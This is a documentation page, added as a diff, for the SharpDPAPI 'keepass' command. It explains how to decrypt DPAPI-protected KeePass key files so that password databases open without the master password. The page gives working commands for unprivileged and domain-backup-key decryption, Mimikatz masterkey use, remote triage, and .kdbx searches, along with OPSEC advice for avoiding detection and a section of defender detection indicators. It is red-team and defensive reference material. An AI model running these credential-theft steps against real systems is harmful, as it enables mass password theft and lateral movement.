@@ -1,0 +1,390 @@
+---
+title: 'keepass'
+description: 'Decrypt KeePass protected user key files'
+icon: 'lock'
+---
+
+## Overview
+
+The **keepass** command searches for and decrypts KeePass ProtectedUserKey.bin files. These files contain DPAPI-protected key material used by KeePass to encrypt password databases, providing access to potentially hundreds of stored credentials.
+
+<Info>
+  KeePass can use Windows DPAPI to protect its master key file. Decrypting this file allows you to open KeePass databases without knowing the master password.
+</Info>
+
+## Basic Usage
+
+```bash
+# Decrypt with CryptUnprotectData (unprivileged)
+SharpDPAPI.exe keepass /unprotect
+
+# Decrypt with domain backup key
+SharpDPAPI.exe keepass /pvk:key.pvk
+
+# Decrypt with masterkey mappings
+SharpDPAPI.exe keepass {GUID1}:SHA1 {GUID2}:SHA1
+
+# Target specific ProtectedUserKey.bin file
+SharpDPAPI.exe keepass /target:C:\Path\To\ProtectedUserKey.bin /unprotect
+```
+
+## Command Arguments
+
+### Decryption Methods
+
+<Tabs>
+  <Tab title="CryptUnprotectData">
+    ```bash
+    # Use Windows API for decryption (unprivileged)
+    SharpDPAPI.exe keepass /unprotect
+    ```
+
+    <Tip>
+      This method works **without** needing masterkeys if run from the user context who created the protected key file. No LSASS access required!
+    </Tip>
+  </Tab>
+
+  <Tab title="Domain Backup Key">
+    ```bash
+    # Base64-encoded key
+    SharpDPAPI.exe keepass /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+
+    # Key file
+    SharpDPAPI.exe keepass /pvk:key.pvk
+    ```
+
+    First decrypts user masterkeys, then uses them to decrypt the KeePass key file.
+  </Tab>
+
+  <Tab title="Masterkey Mappings">
+    ```bash
+    # Inline masterkeys
+    SharpDPAPI.exe keepass {GUID1}:SHA1 {GUID2}:SHA1
+
+    # Masterkey file
+    SharpDPAPI.exe keepass /mkfile:masterkeys.txt
+    ```
+
+    Directly uses pre-decrypted masterkeys for key file decryption.
+  </Tab>
+
+  <Tab title="User Credentials">
+    ```bash
+    # Plaintext password
+    SharpDPAPI.exe keepass /password:Password123!
+
+    # NTLM hash
+    SharpDPAPI.exe keepass /ntlm:8846F7EAEE8FB117AD06BDD830B7586C
+
+    # DPAPI credkey
+    SharpDPAPI.exe keepass /credkey:abc123...
+    ```
+
+    Decrypts user masterkeys first, then the KeePass key file.
+  </Tab>
+</Tabs>
+
+### Targeting Options
+
+| Argument | Description |
+|----------|-------------|
+| `/target:FILE` | Target specific ProtectedUserKey.bin file |
+| `/target:FOLDER` | Target folder containing KeePass key files |
+| `/server:SERVER` | Triage remote server (requires admin access + pvk/password) |
+
+<Warning>
+  When using `/target` with a file, you must provide either `/unprotect` or {GUID}:SHA1 masterkey mappings. When using `/target` with a folder, the folder must contain DPAPI masterkeys if using `/pvk`.
+</Warning>
+
+## Execution Context
+
+<Tabs>
+  <Tab title="Elevated">
+    When run with administrative privileges:
+    - Triages **all users** on the system
+    - Searches all user profiles for KeePass key files
+    - Maximum key recovery
+  </Tab>
+
+  <Tab title="Unelevated">
+    When run without elevation:
+    - Only triages **current user**
+    - Can use `/unprotect` without masterkeys
+    - Most OPSEC-friendly approach
+  </Tab>
+</Tabs>
+
+## Example: Using /unprotect
+
+```bash
+SharpDPAPI.exe keepass /unprotect
+```
+
+**Output:**
+```
+[*] Action: KeePass Triage
+
+[*] Using CryptUnprotectData() for decryption.
+
+[*] Triaging KeePass ProtectedUserKey.bin files for current user
+
+    File             : C:\Users\harmj0y\AppData\Roaming\KeePass\ProtectedUserKey.bin
+    Accessed         : 3/1/2021 1:38:22 PM
+    Modified         : 1/4/2021 5:49:49 PM
+    guidMasterKey    : {dab90445-0a08-4b27-9110-b75d4a7894d0}
+    size             : 210
+    flags            : 0x0
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      :
+    Key Bytes        : 39 2E 63 EF 0E 37 E8 5C 34 ...
+
+
+SharpDPAPI completed in 00:00:00.0566660
+```
+
+<Tip>
+  Save the Key Bytes output - these can be used with the modified KeePass version from [KeeThief](https://github.com/GhostPack/KeeThief/tree/master/KeePass-2.34-Source-Patched) to open password databases.
+</Tip>
+
+## Using Decrypted Key Bytes
+
+Once you have the decrypted key bytes, you can use them to open KeePass databases:
+
+<Steps>
+  <Step title="Obtain Decrypted Key">
+    ```bash
+    SharpDPAPI.exe keepass /unprotect
+    # Save the "Key Bytes" output
+    ```
+  </Step>
+
+  <Step title="Get Modified KeePass">
+    Download the [modified KeePass from KeeThief](https://github.com/GhostPack/KeeThief/tree/master/KeePass-2.34-Source-Patched)
+
+    This version accepts raw key bytes instead of a master password
+  </Step>
+
+  <Step title="Open Database">
+    Use the decrypted key bytes with the modified KeePass to open the user's password database without knowing their master password
+  </Step>
+</Steps>
+
+## KeePass Protected Key File Location
+
+**Default Location:**
+```
+%APPDATA%\KeePass\ProtectedUserKey.bin
+```
+
+**Alternative Locations:**
+- Custom KeePass configuration directories
+- Portable KeePass installations
+- Network/shared KeePass configurations
+
+## How KeePass DPAPI Protection Works
+
+<Steps>
+  <Step title="User Enables Protection">
+    KeePass offers "User account" protection option which uses Windows DPAPI
+  </Step>
+
+  <Step title="Key Material Encryption">
+    KeePass encrypts the master key material with user's DPAPI masterkey
+  </Step>
+
+  <Step title="Protected Key Saved">
+    Encrypted key saved to ProtectedUserKey.bin in KeePass profile
+  </Step>
+
+  <Step title="Automatic Unlock">
+    When KeePass runs, it uses CryptUnprotectData() to automatically decrypt the key
+  </Step>
+</Steps>
+
+<Note>
+  This protection binds the KeePass database to the Windows user account. If the user logs in, KeePass can open automatically without prompting for a password.
+</Note>
+
+## Common Scenarios
+
+<AccordionGroup>
+  <Accordion title="Unprivileged Execution (Recommended)">
+    Run as the target user without elevation:
+
+    ```bash
+    # No masterkeys or elevation needed
+    SharpDPAPI.exe keepass /unprotect
+
+    # Target specific key file
+    SharpDPAPI.exe keepass /target:C:\Users\admin\AppData\Roaming\KeePass\ProtectedUserKey.bin /unprotect
+    ```
+
+    **Benefits:**
+    - No LSASS access required
+    - No elevation needed
+    - Minimal detection footprint
+  </Accordion>
+
+  <Accordion title="Post-Domain Compromise">
+    After obtaining domain admin and backup key:
+
+    ```bash
+    # 1. Retrieve backup key
+    SharpDPAPI.exe backupkey /file:key.pvk
+
+    # 2. Decrypt KeePass keys locally
+    SharpDPAPI.exe keepass /pvk:key.pvk
+
+    # 3. Decrypt on remote systems
+    SharpDPAPI.exe keepass /pvk:key.pvk /server:admin-workstation.domain.com
+    ```
+  </Accordion>
+
+  <Accordion title="Using Mimikatz-Extracted Masterkeys">
+    Extract masterkeys and decrypt KeePass key files:
+
+    ```bash
+    # 1. In Mimikatz
+    # mimikatz# privilege::debug
+    # mimikatz# sekurlsa::dpapi
+
+    # 2. Run SharpDPAPI with extracted masterkeys
+    SharpDPAPI.exe keepass {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB513717AA...
+    ```
+  </Accordion>
+
+  <Accordion title="Offline/Forensic Analysis">
+    Analyzing copied KeePass configuration:
+
+    ```bash
+    # Target specific file with backup key
+    SharpDPAPI.exe keepass /target:C:\Evidence\ProtectedUserKey.bin /pvk:key.pvk
+
+    # With masterkey mappings
+    SharpDPAPI.exe keepass /target:C:\Evidence\ProtectedUserKey.bin {GUID}:SHA1
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Finding KeePass Databases
+
+After decrypting the protected key, locate the KeePass databases:
+
+**Common Locations:**
+```
+%USERPROFILE%\Documents\*.kdbx
+%USERPROFILE%\Desktop\*.kdbx
+%USERPROFILE%\KeePass\*.kdbx
+Network shares
+Cloud storage (OneDrive, Dropbox, etc.)
+```
+
+**Search for databases:**
+```bash
+# PowerShell
+Get-ChildItem -Path C:\Users\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue
+
+# CMD
+dir C:\Users\*.kdbx /s
+```
+
+## Detection Considerations
+
+**Host-Based Indicators:**
+- Reading ProtectedUserKey.bin file
+- Non-KeePass processes accessing KeePass configuration
+- Enumeration of KeePass directories
+- Access to .kdbx database files
+
+**Defensive Monitoring:**
+- Monitor access to `%APPDATA%\KeePass\ProtectedUserKey.bin`
+- Alert on ProtectedUserKey.bin access by non-KeePass processes
+- Track .kdbx file access patterns
+- Detect bulk KeePass configuration enumeration
+- Monitor for LSASS access (when not using /unprotect)
+
+**Event Log Indicators:**
+```
+Event ID: 4663 (File Access)
+Object Name: *\KeePass\ProtectedUserKey.bin
+Object Name: *.kdbx
+Process Name: Not KeePass.exe
+```
+
+## Why Target KeePass?
+
+<CardGroup cols={2}>
+  <Card title="Credential Jackpot" icon="treasure-chest">
+    Password managers contain hundreds or thousands of credentials
+  </Card>
+  <Card title="High-Value Targets" icon="crown">
+    Often contains admin, service account, and critical system passwords
+  </Card>
+  <Card title="Lateral Movement" icon="arrows-split-up-and-left">
+    Provides credentials for multiple systems and services
+  </Card>
+  <Card title="Persistent Access" icon="clock">
+    Credentials remain valid even after user password changes
+  </Card>
+</CardGroup>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Comprehensive user DPAPI triage
+  </Card>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt Credential Manager files
+  </Card>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys
+  </Card>
+  <Card title="backupkey" icon="download" href="/ghostpack-docs/SharpDPAPI-mdx/commands/backupkey">
+    Retrieve domain backup key
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Best Practices">
+  - Prefer `/unprotect` when running as the target user
+  - Look for KeePass on administrator and privileged user workstations
+  - After decrypting key, search entire system for .kdbx files
+  - Check network shares and cloud storage for KeePass databases
+  - Combine with file search to locate all password databases
+</Accordion>
+
+<Accordion title="OPSEC Considerations">
+  - Use `/unprotect` for minimal detection footprint
+  - Run without elevation when possible
+  - Target specific files if locations are known
+  - Redirect output to file with `/consoleoutfile`
+  - Avoid bulk enumeration if stealth is required
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **No KeePass files found:**
+  - User may not use KeePass protection feature
+  - KeePass may use master password instead of Windows protection
+  - Check for portable KeePass installations
+  - Look in non-standard configuration directories
+
+  **Decryption fails with /unprotect:**
+  - Must run from the user context who created the protected key
+  - Try using masterkeys or backup key instead
+  - Verify you're running as the correct user
+  - File may be corrupted or invalid format
+
+  **Can't find KeePass database:**
+  - Search entire file system for .kdbx files
+  - Check network shares and mapped drives
+  - Look in cloud storage sync folders
+  - User may keep database on removable media
+</Accordion>
+
+## Additional Resources
+
+<Card title="KeeThief Project" icon="github" href="https://github.com/GhostPack/KeeThief">
+  Modified KeePass version and additional tools for KeePass credential extraction
+</Card>
